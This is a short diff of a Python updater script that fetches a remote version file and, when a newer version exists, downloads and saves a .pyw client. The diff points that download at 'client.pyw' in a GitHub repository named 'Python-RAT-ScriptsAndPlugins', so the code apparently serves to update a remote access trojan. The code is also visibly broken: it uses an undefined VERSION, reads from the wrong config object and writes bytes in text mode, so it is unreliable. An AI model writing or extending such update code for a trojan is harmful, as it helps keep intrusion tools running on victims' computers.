@@ -30,7 +30,7 @@ localconfig = configparser.ConfigParser()
 localconfig.read('LOCALVERSION.ini')
 LOCALVERSION = config['LocalVersionInfo']['ClientVersion']
 VersionDataURL = ""
-FileDataURL = ""
+FileDataURL = "https://raw.githubusercontent.com/finnaminope/Python-RAT-ScriptsAndPlugins/beta/client.pyw"
 r = requests.get(VersionDataURL) # create HTTP response object
 with open("INETVERSIONINFO.ini",'w') as f:
 	f.write(r.content)
@@ -42,7 +42,7 @@ INETVERSION = config['INetVersionInfo']['ClientVersion']
 if LOCALVERSION < INETVERSION:
     r = requests.get(FileDataURL)  
     with open('file_name.pyw', 'wb') as f:
-    f.write(r.content)
+        f.write(r.content)
 
 
 config['LocalVersionInfo']['ClientVersion'] = VERSION    # update
